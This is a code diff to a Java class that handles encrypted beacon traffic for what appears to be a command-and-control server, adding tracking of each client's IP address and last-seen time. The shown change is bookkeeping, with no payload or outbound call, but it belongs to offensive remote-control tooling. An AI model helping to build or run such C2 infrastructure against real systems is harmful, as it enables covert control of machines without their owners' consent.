@@ -34,6 +34,9 @@ public class C2ServerBeaconHandler implements Runnable{
     // Sentinel used for this thread to run
     private boolean sentinel;
 
+    // Variable to store the client's IP Address
+    private String clientIP;
+
     /**
      * Class used to create a new thread, to handle messages coming from an individual beacon to the C2 server
      * 
@@ -54,6 +57,7 @@ public class C2ServerBeaconHandler implements Runnable{
         this.shellLock = shellLock;
         this.aes = aes;
         this.sentinel = true;
+        this.clientIP = null;
     }
 
     protected void setIsShell(Boolean value){
@@ -95,6 +99,9 @@ public class C2ServerBeaconHandler implements Runnable{
             keepAliveThread.start();
             while(sentinel){
                 String response = aes.decrypt(duplexer.receive(true));
+                if (this.clientIP != null){
+                    C2server.updateClientLastSeen(this.clientIP);
+                }
                 if(!(response.equals("KEEP_ALIVE"))){
                     // Convert the string we just got to json, then to a map, and extact the 3 fields we care about
                     jsonResponse = (new JSONObject(response).toMap());
@@ -115,7 +122,7 @@ public class C2ServerBeaconHandler implements Runnable{
                         // When we are notified of a new client, intialize the varaibles, and notify the User that there is a new client
                         C2server.outputToUser(data + " at " + ip);
                         C2server.intializeVars(ip, data);
-
+                        this.clientIP = ip;
                     } else if (type.equals("client_disconnect")){
                         // When we are notified of a client disconnect, notify the user that there is a new client
                         // and append a message to the end of the dictionaries
